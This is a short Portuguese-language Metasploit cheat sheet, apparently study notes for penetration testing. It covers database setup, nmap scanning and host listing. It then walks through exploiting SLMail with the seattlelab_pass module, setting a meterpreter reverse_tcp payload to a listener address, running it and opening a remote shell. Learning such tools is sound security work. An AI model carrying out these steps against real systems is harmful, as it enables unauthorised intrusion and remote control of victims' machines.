# MetaSploit Framework

Ferramenta desenvolvida pela rapid7.com para auxiliar na criação e utilização de exploits.

Iniciando MSF:
service postgresql start
msfconsole

Comando de ajuda:
msf > help

Verificando a conexão com o banco de dados:
msf > db_status

Escaneamento de alvo salvando as informações no DB:
msf > db_nmap -A 172.16.1.4

Importando arquivo XML do NMAP:
nmap -v -A 172.16.1.5 -oX host5.xml
msf > db_import host5.xml

Listagem dos hosts:
msf > hosts

Verificando vulnerabilidade nos hosts:
msf > vulns

Listagem de serviços:
msf > services

Buscando exploit:
msf > search slmail

Usando exploit:
msf > use exploit/windows/pop3/seattlelab_pass

Ver informações do exploit:
msf exploit(seattlelab_pass) > info

Setando parâmetros no exploit:
msf exploit(seattlelab_pass) > show options
msf exploit(seattlelab_pass) > set RHOST 172.16.1.4
msf exploit(seattlelab_pass) > show options

Verificando payloads disponíveis:
msf exploit(seattlelab_pass) > show payloads

Setando payload para ser utilizado:
msf exploit(seattlelab_pass) > set payload windows/meterpreter/reverse_tcp
msf exploit(seattlelab_pass) > show options
msf exploit(seattlelab_pass) > set LHOST 172.20.0.2
msf exploit(seattlelab_pass) > set LPORT 4444
msf exploit(seattlelab_pass) > show options

Executando exploit:
msf exploit(seattlelab_pass) > exploit
meterpreter > ipconfig

Verificando comandos no meterpreter:
meterpreter > help

Abrindo o shell:
meterpreter > shell

Exibindo módulos auxiliares:
msf > show auxiliary
